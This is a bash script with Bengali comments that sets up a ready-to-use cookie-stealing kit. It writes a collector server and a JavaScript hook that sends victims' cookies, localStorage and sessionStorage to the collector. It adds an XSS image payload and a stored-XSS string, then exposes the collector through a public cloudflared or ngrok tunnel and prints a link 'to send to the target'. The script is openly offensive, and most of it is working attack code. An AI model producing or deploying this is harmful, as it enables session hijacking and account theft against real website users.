#!/usr/bin/env bash
# all_in_one.sh — অটো-সেটআপ, অটো-টানেল, লাইভ-লগ, রেডি-টু-ক্যাপচার কুকি-স্টিলার
# চালাও: bash all_in_one.sh
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$DIR"

PORT="${PORT:-9090}"
export PORT
export LOG_FILE="hits.log"

# =================== ০. প্রয়োজনীয় টুল চেক ===================
need() { command -v "$1" >/dev/null 2>&1 || { echo "[!] $1 নেই — sudo apt install $2"; exit 1; }; }
need python3 python3
if ! command -v cloudflared >/dev/null 2>&1 && ! command -v ngrok >/dev/null 2>&1; then
  echo "[*] cloudflared/ngrok কোনোটাই নেই — cloudflared ইনস্টল করছি (লিনাক্স amd64)..."
  curl -fsSL "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" \
    -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared
fi
need curl curl

# =================== ১. ফাইল লিখন ===================
echo "[*] কিট ফাইল তৈরি করছি..."
mkdir -p testpage

# ---------- collector.py ----------
cat > collector.py <<'PYEOF'
import base64
import json
import os
import socketserver
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

LOG = os.environ.get("LOG_FILE", "hits.log")

class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")

    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()

    def do_GET(self): self._handle()
    def do_POST(self): self._handle()

    def _handle(self):
        q = parse_qs(urlparse(self.path).query)
        raw = q.get("d", [""])[0]

        if not raw and "Content-Length" in self.headers:
            try:
                length = int(self.headers["Content-Length"])
                raw = self.rfile.read(length).decode(errors="replace")
            except Exception:
                raw = ""

        if not raw:
            raw = q.get("c", [""])[0]

        if raw:
            try:
                data = json.loads(base64.b64decode(raw).decode())
            except Exception:
                data = {"raw": raw}

            entry = {
                "time": datetime.now(timezone.utc).isoformat(),
                "ip": self.client_address[0],
                "ua": self.headers.get("User-Agent", ""),
                "ref": self.headers.get("Referer", ""),
                "data": data,
            }

            try:
                with open(LOG, "a", encoding="utf-8") as f:
                    f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            except Exception as e:
                print(f"[!] log write failed: {e}")

            print(f"[+] hit from {entry['ip']} — {entry['data'].get('u', 'no-url')}")
            print(json.dumps(entry, ensure_ascii=False, indent=2))
            print("-" * 60)

        self.send_response(204)
        self._cors()
        self.end_headers()

    def log_message(self, fmt, *args):
        pass


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "9090"))
    open(LOG, "a").close()
    print(f"[*] collector listening on 127.0.0.1:{port}")
    print(f"[*] log file: {os.path.abspath(LOG)}")
    try:
        Server(("127.0.0.1", port), Handler).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] collector stopped")
PYEOF

# ---------- cookie_hook.js ----------
cat > cookie_hook.js <<'JSEOF'
(function () {
  var base = "http://127.0.0.1:9090";
  var payload = {
    u: location.href,
    c: document.cookie,
    l: localStorage.length ? JSON.stringify(localStorage) : "",
    s: sessionStorage.length ? JSON.stringify(sessionStorage) : "",
    t: Date.now(),
    r: document.referrer,
    sc: screen.width + "x" + screen.height,
  };
  var img = new Image();
  img.src = base + "/collect?d=" + encodeURIComponent(btoa(JSON.stringify(payload)));
  document.body.appendChild(img);

  fetch(base + "/collect?c=" + encodeURIComponent(document.cookie), { credentials: "include" }).catch(function () {});
})();
JSEOF

# ---------- payload.html ----------
cat > payload.html <<'HTMLEOF'
<img src="x" onerror="var s=document.createElement('script');s.src='http://127.0.0.1:9090/cookie_hook.js';document.body.appendChild(s);">
HTMLEOF

# ---------- stored_xss.txt ----------
cat > stored_xss.txt <<'XSSEOF'
"><script src="http://127.0.0.1:9090/cookie_hook.js"></script>
XSSEOF

# ---------- testpage ----------
cat > testpage/index.html <<'TESTEOF'
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>self test</title></head>
<body>
  <h1>self test</h1>
  <script>
    document.cookie = "test_session=hello123; path=/";
    var s = document.createElement('script');
    s.src = "http://127.0.0.1:9090/cookie_hook.js";
    document.body.appendChild(s);
  </script>
</body></html>
TESTEOF

echo "[*] কিট ফাইল লেখা হয়েছে ✅"

# =================== ২. টানেল চালু ===================
echo "[*] টানেল চালু করছি (পাবলিক URL দেবে)..."
TUNNEL_LOG="$DIR/tunnel.log"
: > "$TUNNEL_LOG"

if command -v cloudflared >/dev/null 2>&1; then
  cloudflared tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$TUNNEL_LOG" 2>&1 &
  TUNNEL_PID=$!
else
  ngrok http "$PORT" --log=stdout --log-level=info > "$TUNNEL_LOG" 2>&1 &
  TUNNEL_PID=$!
fi

echo "[*] টানেল PID=$TUNNEL_PID, URL খুঁজছি..."

# URL পড়া (৩০ সেকেন্ড পর্যন্ত অপেক্ষা)
TUNNEL_URL=""
for i in $(seq 1 30); do
  TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.(trycloudflare\.com|ngrok-free\.app|ngrok\.io|lhr\.life)' "$TUNNEL_LOG" | head -n 1 || true)
  [ -n "$TUNNEL_URL" ] && break
  sleep 1
done

if [ -z "$TUNNEL_URL" ]; then
  echo "[!] পাবলিক URL পাওয়া যায়নি — tunnel.log দেখো"
  cat "$TUNNEL_LOG" | tail -n 20
  exit 1
fi

echo "[*] পাবলিক URL: $TUNNEL_URL ✅"

# =================== ৩. URL বসানো ===================
echo "[*] হুক ও পে-লোডে URL বসাচ্ছি..."
sed -i "s#http://127.0.0.1:$PORT#${TUNNEL_URL}#g" cookie_hook.js payload.html stored_xss.txt testpage/index.html
echo "[*] URL বসানো হয়েছে ✅"

# =================== ৪. কলেক্টর চালু ===================
echo "[*] কলেক্টর চালু করছি..."
if command -v ss >/dev/null 2>&1; then
  if ss -ltn "sport = :$PORT" 2>/dev/null | grep -q LISTEN; then
    echo "[*] পোর্ট $PORT ব্যস্ত — পুরনো কলেক্টর মেরে দিচ্ছি"
    pkill -9 -f collector.py || true
    sleep 1
  fi
fi

python3 collector.py > collector.log 2>&1 &
COLLECTOR_PID=$!
sleep 1

if ! kill -0 "$COLLECTOR_PID" 2>/dev/null; then
  echo "[!] কলেক্টর চালু হয়নি — collector.log দেখো"
  cat collector.log | tail -n 20
  exit 1
fi
echo "[*] কলেক্টর PID=$COLLECTOR_PID, পোর্ট=$PORT ✅"

# =================== ৫. লাইভ লগ ===================
cat <<BANNER

============================================================
  🍪 KIT READY — COOKIE COLLECTOR (all-in-one)
============================================================
  COLLECT URL: ${TUNNEL_URL}/collect
  TEST PAGE:   ${TUNNEL_URL}/cookie_hook.js
  PAYLOAD HTML: ${TUNNEL_URL}/payload.html
  টার্গেটে পাঠানোর লিংক:
    ${TUNNEL_URL}/payload.html
  অথবা stored XSS:
    $(cat stored_xss.txt)

  ⚠️  নিজের টেস্টে: ${TUNNEL_URL}/payload.html
  ⚠️  লগ: $(pwd)/hits.log
  ⚠️  বন্ধ করতে: Ctrl+C (tunnel ও collector মরে যাবে)
============================================================

BANNER

# static file server (যাতে /cookie_hook.js, /payload.html ব্রাউজার থেকে পড়া যায়)
# টানেলের পেছনে থাকা এই সার্ভার আলাদা পোর্টে চালাই — ৮০৯০
python3 -m http.server 8090 --directory "$DIR" > /dev/null 2>&1 &
STATIC_PID=$!

cleanup() {
  echo ""
  echo "[*] বন্ধ করছি..."
  kill "$TUNNEL_PID" 2>/dev/null || true
  kill "$COLLECTOR_PID" 2>/dev/null || true
  kill "$STATIC_PID" 2>/dev/null || true
  echo "[*] ঠিক আছে — লগ রয়ে গেছে: $(pwd)/hits.log"
  exit 0
}
trap cleanup INT TERM

echo "[*] লাইভ লগ চালু (hits.log)..."
tail -f hits.log &
TAIL_PID=$!

# অপেক্ষা — Ctrl+C না দিলে চলবে
wait "$TAIL_PID"
